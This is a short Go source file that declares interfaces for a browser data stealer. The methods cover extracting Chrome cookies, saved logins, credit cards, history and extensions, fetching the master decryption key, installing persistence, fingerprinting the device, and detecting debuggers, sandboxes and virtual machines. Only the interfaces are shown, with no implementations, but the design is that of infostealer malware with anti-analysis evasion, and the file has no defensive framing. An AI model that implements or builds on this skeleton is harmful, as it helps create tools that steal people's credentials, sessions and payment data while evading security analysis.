package main

type BrowserDataExtractor interface {
    ExtractCookies(path string) ([]byte, error)
    ExtractLoginData(path string) ([]byte, error)
    ExtractCreditCards(path string) ([]byte, error)
    ExtractHistory(path string) ([]byte, error)
    ExtractExtensions(path string) ([]byte, error)
}

type MasterKeyProvider interface {
    GetMasterKey() ([]byte, error)
}

type ProfileProvider interface {
    GetChromeBasePath() string
    ListProfiles() ([]string, error)
}

type PersistenceProvider interface {
    InstallPersistence() error
    UninstallPersistence()
    DataDumpLocation() string
    ProcessLock() bool
    ProcessUnlock()
    CheckDeviceFingerprint() bool
    FingerprintDevice() error
}

type EnvDetector interface {
    DetectDebugging() (bool, error)
    Protector() error
    DetectSandbox() bool
    VirtualizationSystem() string
}
